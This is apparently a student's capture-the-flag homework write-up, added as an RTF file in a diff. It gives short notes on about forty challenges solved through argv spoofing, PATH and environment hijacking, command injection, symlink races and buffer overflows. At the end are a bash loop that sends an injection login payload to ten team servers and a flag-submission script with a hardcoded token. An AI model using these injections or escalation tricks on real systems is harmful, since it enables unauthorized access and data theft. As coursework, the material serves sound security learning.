@@ -1,0 +1,178 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2580
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fnil\fcharset0 Menlo-Regular;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\csgray\c0;}
+\margl1440\margr1440\vieww27760\viewh14860\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 Challenge 1 :\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f1\fs22 \cf2 \CocoaLigature0 hacker@hw3_level01:/challenge$ ./main TheGreatPassw0rd\
+The argv[1] value was being given to the checksum. After passing the required checksum as argument and after comparison i got shell.\
+\
+\
+Challenge2:\
+The argv[0] value was being given to the checksum. As the given name of the program is main, i changed it using exec -a and gave it the name which is same as the required checksum.\
+/challenge$ exec -a 'abJyvPr6Tk52mTyqoSeQmx' ./main\
+\
+Challenge3:\
+The argv[0] value was being given to the checksum. As the given name of the program is main, i changed it using exec -a and gave it the name which is same as the required checksum since it was checking from the 2nd argument, i gave 2 extra random characters as well.\
+exec -a 'JyvPr6Tk52mTyqoSeQmx' ./main\
+\
+exec -a 'py26jr5mmLktuNIy2Apt' ./main\
+\
+Challenge 4:\
+The argv[1] value was being given to the checksum. After passing the required checksum as argument and after comparison i got shell.\
+./main py26jr5mmLktuNIy2Apt\
+\
+Challenge 5:\
+Found the given md5 in md5 lookup tables and gave the input string as the argument and got the shell.\
+\
+Challenge 6:\
+Gave null for strcmp to compare and got shell.\
+\
+\
+challenge 7:\
+./home/hacker/file;./main "hfyr"\
+Made a c program which copies the flag and saves it. Firstly ran this program and then ran main function with any random argument. After this got the flag in that file created by the c program.\
+\
+\
+\
+Challenge 8:\
+changing the home directory to / \
+hacker@hw3_level08:/challenge$ export HOME=/\
+\
+\
+Challenge 9:\
+changing the home directory\
+hacker@hw3_level09:/challenge$ export HOME=/\
+\
+\
+Challenge 10:\
+Setting environment variable to \'93\'94 worked\
+hacker@hw3_level10:/challenge$ export BASE=""\
+hacker@hw3_level10:/challenge$ ./main\
+\
+Challenge 11:\
+Setting environment variable to \'93\'94 worked and base to /\
+\
+\
+Challenge 12:\
+Change the base directory to /\
+hacker@hw3_level12:/challenge$ export BASE=/\
+\
+Challenge 13:\
+Used the sleep time to our advantage to create symlink as the check for symlink was already completed till that point in code.\
+\
+Challenge 14:\
+As the program is just giving the output of file in xml format, I just gave /flag as parameter and found the flag in the body.\
+\
+\
+Challenge 15:\
+\
+As the program is just giving the output of file in xml format, I just gave /flag as parameter and found the flag in the body.\
+\
+Challenge 16:\
+\
+As the program is just giving the output of file in xml format, I just gave /flag as parameter and found the flag in the body.\
+\
+Challenge 17:\
+\
+As the program is just giving the output of file in xml format, I just gave /flag as parameter and found the flag in the body.\
+\
+\
+challenge 18:\
+Wrote a c program where it is copying the contents of /flag file and pasting it to another file in tmp directory and named it as tidy. changed the env path to /home/hacker and ran the ./main with random binary. This was the program that we wrote runs instead of the tidy written in main.\
+\
+Challenge 19, 20, 21, 22 and 23\
+Used && to write 2 commands in one line and got shell by giving /bin/sh\
+\
+\
+Challenge 24:\
+/challenge$ ./main 'hack" -exec /home/hacker/hack \{\} +  -iname "hh'\
+Here we made our own c program which cats the /flag file and prints it. Used the exec flag to get the directory of hack that is /home/hacker and intotality ran /home/hacker/hacker. For the extra \'93 gave another -iname flag and gave random string to close it.\
+\
+\
+Challenge 25:\
+Here we made our own c program which cats the /flag file and prints it. Used the exec flag to get the directory of hack that is /home/hacker and intotality ran /home/hacker/hacker.\
+\
+Challenge 26:\
+Here we made our own c program which cats the /flag file and prints it. Used the exec flag to get the directory of hack that is /home/hacker and intotality ran /home/hacker/hacker.  \
+\
+Challenge 27 :\
+In this program we had to update the stack so we updated the rip with the address of get_me_a_shell and got shell\
+\
+\
+Challenge 28 :\
+updating the flag value to the address given and shell() executed\
+./main 9 0x13371337\
+\
+Challenge 29:\
+Got the flag address from dissembly and simply copied the required value to it	\
+Challenge 30:\
+We had to overflow the array in this level. So i wrote the shell code in /home/hacker. got its address and as the difference between the array and rip was 88, I took the 11th index of array and kept the value as the address of the shellcode. This gave me a shell\
+\
+challenge 31:\
+overflowed buffer to  get value in is_god and done!!\
+\
+\
+challenge 32:\
+Written junk 32 in-between and got the address of checksum and buffer from gdb  and wrote mdf5sum \
+\
+\
+challenge 33:\
+Made 1st character of md5 null and compared with null byte and got #\
+\
+Challenge 34:\
+Here we made our own c program which cats the /flag file and prints it. Used the exec flag to get the directory of hack that is /home/hacker and intotality ran /home/hacker/hacker. \
+\
+Challenge 35:\
+Overflowed buffer to overwrite checksum1 to the md5 of user value\
+\
+Challenge 36:\
+In this we had to overflow the stack and there we had to make the first byte of the md5 zero. SO we took such a number whose initial byte is zero. Got its md5 found its raw format and overflowed this raw format. Kept random initial byte for md5 as otherwise the strcpy will stop at first byte only.\
+\
+Challenge 37:\
+Made our own program and executed using execlp.\
+\
+Challenge 40:\
+made a file /home/hacker/40.cmd with cat /flag written in it and it worked.\
+\
+\
+challenge 41:\
+Overflowed the password so that it oveewites the username and got the shell\
+\
+\
+\
+\
+#!/bin/bash\
+for team in \{1..10\};do\
+    curl -sLX POST -c - --data "username=blah%27+or+position%28%29%3D2+or+%27a%27%3D%27a&password=g" http://team$team:10002/login.php | grep FLG\
+done;\
+\
+\
+\
+\
+from swpag_client import Team\
+\
+\
+with open("file.txt") as f:\
+    content = f.readlines()\
+\
+flg = []\
+#flag_list = content.split('\\n')\
+for i in content:\
+    l = str(i).lstrip('<p class="desc">')\
+    r = l.rstrip('</p>\\r\\n')\
+    flg.append(r)\
+    \
+t = Team("http://actf5_team.cse545.io", "6AUKkz5J93QKIlMc2Teq")\
+\
+for i in flg:\
+    print(t.submit_flag([i]))\
+\
+\
+\
+\
+}
